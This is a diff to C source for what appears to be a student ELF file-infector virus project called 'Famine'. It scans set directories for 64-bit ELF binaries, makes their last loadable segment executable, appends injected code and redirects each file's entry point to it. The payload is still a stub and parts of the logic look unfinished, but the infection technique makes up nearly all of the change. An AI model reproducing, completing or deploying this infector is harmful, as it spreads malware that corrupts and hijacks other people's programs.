@@ -6,10 +6,11 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/05/27 01:59:04 by root             ###   ########.fr       */
+/*   Updated: 2018/05/27 16:15:06 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
+#include <elf.h>
 #include <sys/mman.h>
 #include <string.h>
 #include <unistd.h>
@@ -39,6 +40,8 @@ char		*direct[] = { "/tmp/test/", "/tmp/test2/", NULL };
 void	find_files(char *dir);
 void	get_dat_elf(char *dir, char *file);
 void	pack_dat_elf(int fd, int size, char *data);
+void	famine64_func(void);
+uint32_t	famine64_size = 42;
 
 int main(int ac, char **av)
 {
@@ -109,7 +112,6 @@ void	get_dat_elf(char *dir, char *file)
 		close(fd);
 		return ;
 	}
-	printf("%s ", path);
 	pack_dat_elf(fd, size, data);
 	close(fd);
 	syscall(MUNMAP, data, size);
@@ -121,8 +123,95 @@ void		pack_dat_elf(int fd, int size, char *data)
 		data[4] == 2 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
 		// Ajouter le check de signature de binaire
 	{
-		printf("%s %d %d\n", data, fd, size);
+		/* 1. Find the highest memory mapped PT_LOAD segment */
+		size_t	phoff = ((Elf64_Ehdr *)data)->e_phoff;
+		Elf64_Phdr *program = (Elf64_Phdr *)(data + phoff);
+		Elf64_Phdr *iprogram = NULL;
+		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++) {
+			if (program[i].p_type == PT_LOAD) {
+				if (!iprogram ||
+					program[i].p_vaddr > iprogram->p_vaddr) {
+					iprogram = &program[i];
+				}
+			}
+		}
+		/* Extra: Change the offset of sections higher than our code offset, for debug. */
+		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
+		Elf64_Shdr *section = (Elf64_Shdr *)(data + shoff);
+		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
+			if (section[i].sh_offset >= iprogram->p_offset + iprogram->p_memsz) {
+				section[i].sh_offset += famine64_size;
+			}
+		}
+		/* 2. Compute the virtual address of our code */
+		Elf64_Addr new_entry = iprogram->p_vaddr + iprogram->p_memsz;
+		/* 3. Change the elf header */
+		Elf64_Addr old_entry = ((Elf64_Ehdr *)data)->e_entry;
+		((Elf64_Ehdr *)data)->e_entry = new_entry;
+		((Elf64_Ehdr *)data)->e_shoff += famine64_size;
+		/* 4. Change the program header */
+		if ((iprogram->p_flags & PF_X) == 0)
+			iprogram->p_flags |= PF_X;
+		iprogram->p_memsz += famine64_size;
+		iprogram->p_filesz = iprogram->p_memsz;
+/* Get the offset in file to write our code */
+		size_t off = iprogram->p_offset + iprogram->p_memsz - famine64_size;
+		write(fd, data, off);
+		write(fd, &famine64_func, famine64_size - sizeof(old_entry));
+		write(fd, &old_entry, sizeof(old_entry));
+		write(fd, data + off, size - off);
 	}
-	else
-		printf("not en elf file\n");
+	(void)fd;
+	(void)size;
+	(void)data;
+}
+/*
+		typedef struct
+		{
+16			unsigned char e_ident[EI_NIDENT];
+2			Elf64_Half    e_type;
+2			Elf64_Half    e_machine;
+4			Elf64_Word    e_version;
+8			Elf64_Addr    e_entry;
+8			Elf64_Off e_phoff;
+8			Elf64_Off e_shoff;
+4			Elf64_Word    e_flags;
+2			Elf64_Half    e_ehsize;
+2			Elf64_Half    e_phentsize;
+2			Elf64_Half    e_phnum;
+2			Elf64_Half    e_shentsize;
+2			Elf64_Half    e_shnum;
+2			Elf64_Half    e_shstrndx;
+		} Elf64_Ehdr;
+
+		typedef struct
+		{
+4			Elf64_Word    p_type;
+4			Elf64_Word    p_flags;
+8			Elf64_Off     p_offset;
+8			Elf64_Addr    p_vaddr;
+8			Elf64_Addr    p_paddr;
+8			Elf64_Xword   p_filesz;
+8			Elf64_Xword   p_memsz;
+8			Elf64_Xword   p_align;
+56		} Elf64_Phdr;
+
+		typedef struct
+		{
+4			Elf64_Word    sh_name;
+4			Elf64_Word    sh_type;
+8			Elf64_Xword   sh_flags;
+8			Elf64_Addr    sh_addr;
+8			Elf64_Off     sh_offset;
+8			Elf64_Xword   sh_size;
+4			Elf64_Word    sh_link;
+4			Elf64_Word    sh_info;
+8			Elf64_Xword   sh_addralign;
+8			Elf64_Xword   sh_entsize;
+64		} Elf64_Shdr;
+*/
+
+void		famine64_func(void)
+{
+	return ;
 }
